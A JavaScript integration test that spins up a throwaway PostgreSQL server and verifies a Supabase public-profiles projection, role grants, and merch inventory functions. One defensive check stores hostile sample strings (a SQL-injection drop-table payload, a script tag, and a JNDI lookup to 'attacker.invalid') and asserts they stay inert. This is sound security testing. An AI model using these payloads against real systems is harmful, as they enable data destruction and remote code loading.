import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import net from "node:net";

const root = process.cwd();
const pgData = mkdtempSync(path.join(tmpdir(), "ttc-public-profiles-pg-"));
const port = await freePort();
let started = false;

function freePort() {
  return new Promise((resolve, reject) => {
    const server = net.createServer();
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      server.close(() => resolve(address.port));
    });
    server.on("error", reject);
  });
}

function pgEnv() {
  return {
    ...process.env,
    PGDATABASE: "postgres",
    PGHOST: "127.0.0.1",
    PGPORT: String(port),
    PGUSER: "postgres",
  };
}

function runBin(bin, args, options = {}) {
  return execFileSync(bin, args, {
    cwd: root,
    encoding: "utf8",
    env: pgEnv(),
    stdio: options.input ? ["pipe", "pipe", "pipe"] : ["ignore", "pipe", "pipe"],
    ...options,
  });
}

function waitForPostgres() {
  let lastError = "";

  for (let attempt = 0; attempt < 80; attempt += 1) {
    try {
      const output = runBin("pg_isready", [
        "-h",
        "127.0.0.1",
        "-p",
        String(port),
        "-d",
        "postgres",
      ]);

      if (output.includes("accepting connections")) return;
      lastError = output;
    } catch (error) {
      lastError = String(error.stdout ?? "") + String(error.stderr ?? "");
    }

    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 250);
  }

  throw new Error("temporary PostgreSQL did not become ready: " + lastError);
}

function sql(text) {
  return runBin("psql", ["-X", "-q", "-v", "ON_ERROR_STOP=1"], {
    input: text,
  });
}

function scalar(text) {
  return runBin("psql", ["-X", "-q", "-t", "-A", "-v", "ON_ERROR_STOP=1"], {
    input: text,
  }).trim();
}

function expectSqlError(text, pattern, label) {
  try {
    sql(text);
  } catch (error) {
    const output = `${error.stdout ?? ""}\n${error.stderr ?? ""}`;
    assert.match(output, pattern, label);
    return;
  }

  assert.fail(`${label}: expected SQL to fail`);
}

function migration(name) {
  return readFileSync(path.join(root, "supabase", "migrations", name), "utf8");
}

function quoteLiteral(value) {
  return `'${value.replaceAll("'", "''")}'`;
}

const users = {
  publicArtist: "00000000-0000-4000-8000-000000000301",
  privateArtist: "00000000-0000-4000-8000-000000000302",
  suspendedArtist: "00000000-0000-4000-8000-000000000303",
  bannedArtist: "00000000-0000-4000-8000-000000000304",
  internalArtist: "00000000-0000-4000-8000-000000000305",
  newArtist: "00000000-0000-4000-8000-000000000306",
};

const approvedColumns = [
  "id",
  "username",
  "display_name",
  "account_type",
  "bio",
  "avatar_url",
  "banner_url",
  "city",
  "region",
  "country",
  "website_url",
  "instagram_url",
  "tiktok_url",
  "facebook_url",
  "youtube_url",
  "x_url",
  "shop_profile_id",
  "license_verified_at",
  "followers_visibility",
  "following_visibility",
  "comment_permission",
  "created_at",
  "updated_at",
];

try {
  runBin(
    "initdb",
    ["-D", pgData, "-U", "postgres", "--auth=trust", "--no-instructions"],
    { stdio: "ignore" },
  );
  runBin(
    "pg_ctl",
    ["-D", pgData, "-o", `-p ${port} -h 127.0.0.1`, "-w", "start"],
    { stdio: "ignore" },
  );
  started = true;
  waitForPostgres();

  sql(`
    create role anon nologin;
    create role authenticated nologin;
    create role service_role nologin bypassrls;
    create schema auth;
    create schema private;
    revoke all on schema private from public;
    grant usage on schema private to authenticated;

    create type public.account_type as enum ('artist', 'enthusiast', 'studio', 'supplier');

    create function auth.uid()
    returns uuid
    language sql
    stable
    as $$
      select nullif(current_setting('request.jwt.claim.sub', true), '')::uuid
    $$;

    create function private.current_user_can_moderate()
    returns boolean
    language sql
    security definer
    set search_path = ''
    stable
    as $$
      select false
    $$;

    grant execute on function private.current_user_can_moderate()
      to authenticated;

    create table public.profiles (
      id uuid primary key,
      username text not null unique,
      display_name text not null,
      account_type public.account_type not null default 'enthusiast',
      bio text,
      avatar_url text,
      banner_url text,
      city text,
      region text,
      country text default 'US',
      website_url text,
      instagram_url text,
      tiktok_url text,
      facebook_url text,
      youtube_url text,
      x_url text,
      shop_profile_id uuid,
      license_verified_at timestamptz,
      followers_visibility text not null default 'public',
      following_visibility text not null default 'public',
      comment_permission text not null default 'everyone',
      is_private boolean not null default false,
      suspended_at timestamptz,
      banned_at timestamptz,
      role text not null default 'user',
      moderation_note text,
      created_at timestamptz not null default now(),
      updated_at timestamptz not null default now()
    );

    alter table public.profiles enable row level security;

    create policy "Profiles are viewable by everyone"
      on public.profiles for select
      using (true);

    grant select on table public.profiles to anon, authenticated, service_role;

    insert into public.profiles (
      id, username, display_name, account_type, bio, is_private,
      suspended_at, banned_at, moderation_note
    ) values
      ('${users.publicArtist}', 'public_artist', 'Public Artist', 'artist', 'Visible biography', false, null, null, 'never public'),
      ('${users.privateArtist}', 'private_artist', 'Private Artist', 'artist', null, true, null, null, 'private'),
      ('${users.suspendedArtist}', 'suspended_artist', 'Suspended Artist', 'artist', null, false, now(), null, 'suspended'),
      ('${users.bannedArtist}', 'banned_artist', 'Banned Artist', 'artist', null, false, null, now(), 'banned'),
      ('${users.internalArtist}', 'ttc_reviewer', 'Internal Reviewer', 'artist', null, false, null, null, 'internal');
  `);

  sql(migration("20260725160000_create_public_profiles_view.sql"));
  sql(migration("20260725170000_restrict_public_profiles_view_privileges.sql"));
  sql(migration("20260726010000_restrict_anonymous_profile_base_table_access.sql"));

  sql(`
    -- Simulate a historical column-level grant that must not survive the new
    -- projection hardening.
    grant select (banner_url) on table public.profiles to anon;

    create type public.merch_order_status as enum (
      'pending_checkout',
      'paid',
      'fulfilled',
      'partially_refunded',
      'refunded',
      'payment_failed',
      'cancelled'
    );

    create table public.merch_products (
      id uuid primary key,
      status text not null default 'active',
      inventory_quantity integer not null default 0,
      inventory_reserved integer not null default 0,
      updated_at timestamptz not null default now()
    );

    create table public.merch_orders (
      id uuid primary key,
      buyer_id uuid not null,
      status public.merch_order_status not null default 'pending_checkout',
      stripe_checkout_session_id text unique,
      stripe_payment_intent_id text,
      customer_email text,
      shipping_address jsonb not null default '{}'::jsonb,
      shipping_name text,
      platform_fee_cents integer not null default 0,
      subtotal_cents integer not null default 0,
      shipping_cents integer not null default 0,
      tax_cents integer not null default 0,
      discount_cents integer not null default 0,
      total_cents integer not null default 0,
      admin_note text,
      cancelled_at timestamptz,
      inventory_decremented_at timestamptz,
      created_at timestamptz not null default now(),
      updated_at timestamptz not null default now()
    );

    create table public.merch_order_items (
      id uuid primary key,
      order_id uuid not null,
      product_id uuid,
      quantity integer not null,
      fulfillment_status text not null default 'pending'
    );
  `);

  sql(migration("20260722144527_merch_inventory_reservation_lifecycle.sql"));

  const remediationMigrations = readdirSync(path.join(root, "supabase", "migrations"))
    .filter((name) => name.endsWith("_secure_public_profiles_projection.sql"));
  assert.ok(
    remediationMigrations.length <= 1,
    `at most one public profile projection remediation may exist; found ${remediationMigrations.length}`,
  );
  if (remediationMigrations.length === 1) {
    sql(migration(remediationMigrations[0]));
  }

  const migrationOwner = scalar("select current_user;");
  assert.equal(migrationOwner, "postgres", "the disposable migration runs as its admin role");
  const ownedProjectionObjects = [
    {
      label: "dedicated projection schema",
      owner: scalar(`
        select pg_get_userbyid(nspowner)
        from pg_namespace
        where nspname = 'profile_projection';
      `),
    },
    {
      label: "projection table",
      owner: scalar(`
        select pg_get_userbyid(relowner)
        from pg_class
        where oid = 'profile_projection.public_profiles'::regclass;
      `),
    },
    {
      label: "public profile view",
      owner: scalar(`
        select pg_get_userbyid(relowner)
        from pg_class
        where oid = 'public.public_profiles'::regclass;
      `),
    },
    {
      label: "projection synchronization function",
      owner: scalar(`
        select pg_get_userbyid(proowner)
        from pg_proc
        where oid = 'profile_projection.sync_public_profile_projection()'::regprocedure;
      `),
    },
  ];
  for (const object of ownedProjectionObjects) {
    assert.equal(
      object.owner,
      migrationOwner,
      `${object.label} is owned by the migration admin role`,
    );
    assert.ok(
      !["anon", "authenticated", "service_role"].includes(object.owner),
      `${object.label} is not owned by a client role`,
    );
  }

  assert.equal(
    scalar(`
      select option_value
      from pg_class
      cross join lateral pg_options_to_table(coalesce(reloptions, array[]::text[]))
      where oid = 'public.public_profiles'::regclass
        and option_name = 'security_invoker';
    `),
    "true",
    "public.public_profiles executes with caller privileges",
  );
  assert.match(
    scalar("select pg_get_viewdef('public.public_profiles'::regclass, true);"),
    /profile_projection\.public_profiles/i,
    "public view reads only the curated projection",
  );
  assert.equal(
    scalar("select relrowsecurity::text from pg_class where oid = 'profile_projection.public_profiles'::regclass;"),
    "true",
    "the projection keeps RLS enabled as defense in depth",
  );
  assert.equal(
    scalar(`
      select string_agg(column_name, ',' order by ordinal_position)
      from information_schema.columns
      where table_schema = 'public' and table_name = 'public_profiles';
    `),
    approvedColumns.join(","),
    "public view exposes exactly the approved profile fields",
  );
  assert.equal(
    scalar(`
      select string_agg(column_name, ',' order by ordinal_position)
      from information_schema.columns
      where table_schema = 'profile_projection' and table_name = 'public_profiles';
    `),
    approvedColumns.join(","),
    "the synchronized projection contains no private profile fields",
  );
  assert.equal(
    scalar("select has_schema_privilege('anon', 'private', 'usage')::text;"),
    "false",
    "anonymous public view reads do not depend on shared private-schema usage",
  );
  for (const role of ["anon", "authenticated", "service_role"]) {
    assert.equal(
      scalar(`select has_schema_privilege('${role}', 'profile_projection', 'usage')::text;`),
      "true",
      `${role} can resolve the dedicated projection schema`,
    );
    assert.equal(
      scalar(`select has_schema_privilege('${role}', 'profile_projection', 'create')::text;`),
      "false",
      `${role} cannot create objects in the dedicated projection schema`,
    );
  }

  assert.equal(
    scalar("set role anon; select string_agg(username, ',' order by username) from public.public_profiles;"),
    "public_artist",
    "anonymous reads include only eligible public profiles",
  );
  assert.equal(
    scalar("set role authenticated; select string_agg(username, ',' order by username) from public.public_profiles;"),
    "public_artist",
    "authenticated reads use the same curated public projection",
  );
  expectSqlError(
    "set role anon; select id from public.profiles limit 1;",
    /permission denied/i,
    "anonymous clients cannot select public.profiles",
  );
  expectSqlError(
    "set role anon; select banner_url from public.profiles limit 1;",
    /permission denied/i,
    "anonymous clients retain no legacy column-level profile reads",
  );
  expectSqlError(
    "set role anon; select moderation_note from profile_projection.public_profiles limit 1;",
    /column .* does not exist/i,
    "the projection cannot disclose a private moderation field",
  );
  assert.equal(
    scalar("select has_table_privilege('anon', 'public.public_profiles', 'select')::text;"),
    "true",
    "anonymous clients retain curated view reads",
  );
  assert.equal(
    scalar("select has_table_privilege('anon', 'public.public_profiles', 'insert')::text;"),
    "false",
    "anonymous clients cannot mutate the curated view",
  );
  assert.equal(
    scalar("select has_table_privilege('anon', 'public.profiles', 'select')::text;"),
    "false",
    "anonymous clients retain no broad base-table grant",
  );
  assert.equal(
    scalar("select has_any_column_privilege('anon', 'public.profiles', 'select')::text;"),
    "false",
    "anonymous clients retain no per-column base-table grant",
  );
  assert.equal(
    scalar("select has_function_privilege('anon', 'profile_projection.sync_public_profile_projection()', 'execute')::text;"),
    "false",
    "anonymous clients cannot invoke the privileged synchronization function",
  );
  assert.equal(
    scalar("select has_function_privilege('authenticated', 'profile_projection.sync_public_profile_projection()', 'execute')::text;"),
    "false",
    "authenticated clients cannot invoke the privileged synchronization function",
  );
  assert.equal(
    scalar("select has_function_privilege('service_role', 'profile_projection.sync_public_profile_projection()', 'execute')::text;"),
    "false",
    "the service role cannot invoke the trigger-only synchronization function",
  );
  assert.equal(
    scalar("set role service_role; select count(*)::text from public.public_profiles;"),
    "1",
    "the service role can use the public view through the dedicated projection schema",
  );

  sql(`
    update public.profiles
    set display_name = 'Updated Public Artist', bio = 'Updated biography'
    where id = '${users.publicArtist}';
  `);
  assert.equal(
    scalar(`set role anon; select display_name || ':' || bio from public.public_profiles where id = '${users.publicArtist}';`),
    "Updated Public Artist:Updated biography",
    "safe field changes synchronize into the public view",
  );

  const hostileDisplayName = "Robert'); drop table public.profiles; --";
  const hostileBio = "<script>alert('projection')</script> ${jndi:ldap://attacker.invalid/x}";
  sql(`
    update public.profiles
    set
      display_name = ${quoteLiteral(hostileDisplayName)},
      bio = ${quoteLiteral(hostileBio)}
    where id = '${users.publicArtist}';
  `);
  assert.equal(
    scalar(`set role anon; select display_name from public.public_profiles where id = '${users.publicArtist}';`),
    hostileDisplayName,
    "SQL-like profile text remains inert projection data",
  );
  assert.equal(
    scalar(`set role anon; select bio from public.public_profiles where id = '${users.publicArtist}';`),
    hostileBio,
    "markup-like profile text remains inert projection data",
  );
  assert.equal(
    scalar("select to_regclass('public.profiles')::text;"),
    "profiles",
    "hostile profile text cannot alter the source schema",
  );
  console.log("USER INPUT SECURITY REVIEW: PASS hostile profile strings remain inert through projection synchronization");

  sql(`update public.profiles set is_private = true where id = '${users.publicArtist}';`);
  assert.equal(
    scalar(`set role anon; select count(*) from public.public_profiles where id = '${users.publicArtist}';`),
    "0",
    "making a profile private removes it from public reads",
  );
  sql(`update public.profiles set is_private = false where id = '${users.publicArtist}';`);
  assert.equal(
    scalar(`set role anon; select count(*) from public.public_profiles where id = '${users.publicArtist}';`),
    "1",
    "making a profile public restores its curated projection",
  );

  sql(`update public.profiles set suspended_at = now() where id = '${users.publicArtist}';`);
  assert.equal(
    scalar(`set role anon; select count(*) from public.public_profiles where id = '${users.publicArtist}';`),
    "0",
    "suspension removes a profile from public reads",
  );
  for (const internalUsername of ["checkouttest", "qa_android_dm", "ttc_tester"]) {
    sql(`
      update public.profiles
      set suspended_at = null, username = '${internalUsername}'
      where id = '${users.publicArtist}';
    `);
    assert.equal(
      scalar(`set role anon; select count(*) from public.public_profiles where id = '${users.publicArtist}';`),
      "0",
      `${internalUsername} remains excluded after profile updates`,
    );
  }
  sql(`update public.profiles set username = 'public_artist' where id = '${users.publicArtist}';`);

  sql(`
    insert into public.profiles (id, username, display_name, account_type)
    values ('${users.newArtist}', 'new_artist', 'New Artist', 'artist');
  `);
  assert.equal(
    scalar(`set role anon; select display_name from public.public_profiles where id = '${users.newArtist}';`),
    "New Artist",
    "new eligible profiles enter the projection",
  );
  sql(`delete from public.profiles where id = '${users.newArtist}';`);
  assert.equal(
    scalar(`set role anon; select count(*) from public.public_profiles where id = '${users.newArtist}';`),
    "0",
    "deleted profiles leave the projection",
  );

  const hardenedFunctions = [
    "public.reserve_merch_inventory_for_order(uuid)",
    "public.release_merch_inventory_for_order(uuid)",
    "public.cancel_unpaid_merch_order(uuid,text)",
    "public.mark_problem_merch_order_for_checkout(text,text,text,text,jsonb,text,integer,integer,integer,integer,integer,integer)",
    "public.mark_paid_merch_order_for_checkout(text,text,text,jsonb,text,integer,integer,integer,integer,integer,integer)",
  ];

  for (const identity of hardenedFunctions) {
    assert.match(
      scalar(`
        select array_to_string(proconfig, ',')
        from pg_proc
        where oid = '${identity}'::regprocedure;
      `),
      /^search_path=(?:""|)$/,
      `${identity} stores an empty search_path`,
    );
    assert.equal(
      scalar(`select has_function_privilege('anon', '${identity}', 'execute')::text;`),
      "false",
      `${identity} remains unavailable to anonymous clients`,
    );
    assert.equal(
      scalar(`select has_function_privilege('authenticated', '${identity}', 'execute')::text;`),
      "false",
      `${identity} remains unavailable to authenticated clients`,
    );
    assert.equal(
      scalar(`select has_function_privilege('service_role', '${identity}', 'execute')::text;`),
      "true",
      `${identity} remains available to the service role`,
    );
  }

  const merch = {
    buyer: "00000000-0000-4000-8000-000000000400",
    products: [
      "00000000-0000-4000-8000-000000000411",
      "00000000-0000-4000-8000-000000000412",
      "00000000-0000-4000-8000-000000000413",
      "00000000-0000-4000-8000-000000000414",
    ],
    orders: [
      "00000000-0000-4000-8000-000000000421",
      "00000000-0000-4000-8000-000000000422",
      "00000000-0000-4000-8000-000000000423",
      "00000000-0000-4000-8000-000000000424",
    ],
    items: [
      "00000000-0000-4000-8000-000000000431",
      "00000000-0000-4000-8000-000000000432",
      "00000000-0000-4000-8000-000000000433",
      "00000000-0000-4000-8000-000000000434",
    ],
  };

  sql(`
    insert into public.merch_products (id, inventory_quantity)
    values
      ('${merch.products[0]}', 10),
      ('${merch.products[1]}', 10),
      ('${merch.products[2]}', 10),
      ('${merch.products[3]}', 10);

    insert into public.merch_orders (
      id, buyer_id, stripe_checkout_session_id
    ) values
      ('${merch.orders[0]}', '${merch.buyer}', 'cs_reserve_release'),
      ('${merch.orders[1]}', '${merch.buyer}', 'cs_cancel'),
      ('${merch.orders[2]}', '${merch.buyer}', 'cs_problem'),
      ('${merch.orders[3]}', '${merch.buyer}', 'cs_paid');

    insert into public.merch_order_items (
      id, order_id, product_id, quantity
    ) values
      ('${merch.items[0]}', '${merch.orders[0]}', '${merch.products[0]}', 2),
      ('${merch.items[1]}', '${merch.orders[1]}', '${merch.products[1]}', 2),
      ('${merch.items[2]}', '${merch.orders[2]}', '${merch.products[2]}', 2),
      ('${merch.items[3]}', '${merch.orders[3]}', '${merch.products[3]}', 2);
  `);

  scalar(`set role service_role; select public.reserve_merch_inventory_for_order('${merch.orders[0]}');`);
  assert.equal(
    scalar(`
      select o.inventory_reservation_status::text || ':' || p.inventory_reserved::text
      from public.merch_orders o
      join public.merch_products p on p.id = '${merch.products[0]}'
      where o.id = '${merch.orders[0]}';
    `),
    "reserved:2",
    "the real reserve function works with an empty search_path",
  );
  scalar(`set role service_role; select public.release_merch_inventory_for_order('${merch.orders[0]}');`);
  assert.equal(
    scalar(`
      select o.inventory_reservation_status::text || ':' || p.inventory_reserved::text
      from public.merch_orders o
      join public.merch_products p on p.id = '${merch.products[0]}'
      where o.id = '${merch.orders[0]}';
    `),
    "released:0",
    "the real release function works with an empty search_path",
  );

  scalar(`set role service_role; select public.reserve_merch_inventory_for_order('${merch.orders[1]}');`);
  assert.equal(
    scalar(`set role service_role; select id::text || ':' || buyer_id::text from public.cancel_unpaid_merch_order('${merch.orders[1]}', 'owner cancellation');`),
    `${merch.orders[1]}:${merch.buyer}`,
    "the real cancellation function returns the expected order and buyer",
  );
  assert.equal(
    scalar(`
      select o.status::text || ':' || o.inventory_reservation_status::text || ':' || i.fulfillment_status || ':' || p.inventory_reserved::text
      from public.merch_orders o
      join public.merch_order_items i on i.order_id = o.id
      join public.merch_products p on p.id = i.product_id
      where o.id = '${merch.orders[1]}';
    `),
    "cancelled:released:cancelled:0",
    "cancellation releases inventory and cancels the item",
  );

  scalar(`set role service_role; select public.reserve_merch_inventory_for_order('${merch.orders[2]}');`);
  assert.equal(
    scalar(`
      set role service_role;
      select id::text || ':' || buyer_id::text
      from public.mark_problem_merch_order_for_checkout(
        'cs_problem', 'payment_failed', 'pi_problem', 'buyer@example.com',
        '{"line1":"test"}'::jsonb, 'Buyer', 2, 100, 0, 0, 0, 102
      );
    `),
    `${merch.orders[2]}:${merch.buyer}`,
    "the real problem transition returns the expected order and buyer",
  );
  assert.equal(
    scalar(`
      select o.status::text || ':' || o.inventory_reservation_status::text || ':' || p.inventory_reserved::text
      from public.merch_orders o
      join public.merch_order_items i on i.order_id = o.id
      join public.merch_products p on p.id = i.product_id
      where o.id = '${merch.orders[2]}';
    `),
    "payment_failed:released:0",
    "the real problem transition releases reserved inventory",
  );

  scalar(`set role service_role; select public.reserve_merch_inventory_for_order('${merch.orders[3]}');`);
  assert.equal(
    scalar(`
      set role service_role;
      select id::text
      from public.mark_paid_merch_order_for_checkout(
        'cs_paid', 'pi_paid', 'buyer@example.com', '{"line1":"test"}'::jsonb,
        'Buyer', 2, 100, 0, 0, 0, 102
      );
    `),
    merch.orders[3],
    "the real paid transition returns the expected order",
  );
  assert.equal(
    scalar(`
      select o.status::text || ':' || o.inventory_reservation_status::text || ':' ||
        p.inventory_quantity::text || ':' || p.inventory_reserved::text
      from public.merch_orders o
      join public.merch_order_items i on i.order_id = o.id
      join public.merch_products p on p.id = i.product_id
      where o.id = '${merch.orders[3]}';
    `),
    "paid:consumed:8:0",
    "the real paid transition consumes exactly the reserved inventory",
  );

  console.log("PASS real Merch lifecycle functions execute representative paths with empty search_path");

  const serverVersion = scalar("show server_version;");
  console.log(
    `PASS public profile projection database contracts on PostgreSQL ${serverVersion} using disposable port ${port}`,
  );
} finally {
  if (started) {
    try {
      runBin("pg_ctl", ["-D", pgData, "-m", "fast", "-w", "stop"], { stdio: "ignore" });
    } catch {
      // Best-effort cleanup for a disposable local cluster.
    }
  }

  rmSync(pgData, { force: true, recursive: true });
}
